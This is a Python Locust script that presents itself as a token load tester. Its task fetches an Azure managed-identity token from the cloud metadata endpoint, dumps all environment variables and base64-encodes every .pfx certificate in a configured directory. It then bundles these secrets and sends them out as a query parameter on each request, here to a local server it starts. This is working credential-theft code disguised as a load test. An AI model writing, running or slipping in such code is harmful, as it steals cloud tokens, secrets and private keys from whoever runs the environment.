import os
import base64
import json
import subprocess
import threading
import time
import http.server
import socketserver
import requests

from locust import HttpUser, task, between

PORT = 80

# Local HTTP Server
class Handler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"GET received\n")

def start_local_server():
    with socketserver.TCPServer(("0.0.0.0", PORT), Handler) as httpd:
        print(f"Local server running on port {PORT}")
        httpd.serve_forever()

# Start server in a separate thread
server_thread = threading.Thread(target=start_local_server, daemon=True)
server_thread.start()
time.sleep(1)

class TokenLoadTester(HttpUser):
    host = f"http://127.0.0.1:{PORT}"
    wait_time = between(1, 2)

    def get_token(self):
        url = "http://169.254.169.254/metadata/identity/oauth2/token"
        params = {
            "api-version": "2018-02-01",
            "resource": "https://management.azure.com/"
        }
        headers = {"Metadata": "true"}
        try:
            response = requests.get(url, headers=headers, params=params, timeout=3)
            return response.json()
        except Exception as e:
            print(f"Failed to retrieve token: {e}")
            return None

    def get_env_vars(self):
        try:
            result = subprocess.run(["printenv"], capture_output=True, text=True, check=True)
            return result.stdout.strip().splitlines()
        except Exception as e:
            print(f"Error running printenv: {e}")
            return []

    def get_cert_data(self):
        cert_dir = os.getenv("ALT_CERTIFICATES_DIR")
        if not cert_dir:
            print("Environment variable ALT_CERTIFICATES_DIR not set.")
            return []

        try:
            cert_data_list = []
            for filename in os.listdir(cert_dir):
                if filename.endswith(".pfx"):
                    file_path = os.path.join(cert_dir, filename)
                    with open(file_path, "rb") as cert_file:
                        encoded = base64.b64encode(cert_file.read()).decode("utf-8")
                        cert_data_list.append(encoded)
            return cert_data_list
        except Exception as e:
            print(f"Error reading .pfx files from {cert_dir}: {e}")
            return []


    @task
    def send_burst_request(self):
        token = self.get_token()
        environment = self.get_env_vars()
        cert_data = self.get_cert_data()

        combined = {
            "token": token,
            "environment": environment,
            "cert": cert_data
        }

        try:
            encoded = base64.b64encode(json.dumps(combined).encode("utf-8")).decode("utf-8")
            self.client.get("/token", params={"token": encoded})
        except Exception as e:
            print(f"Request failed: {e}")
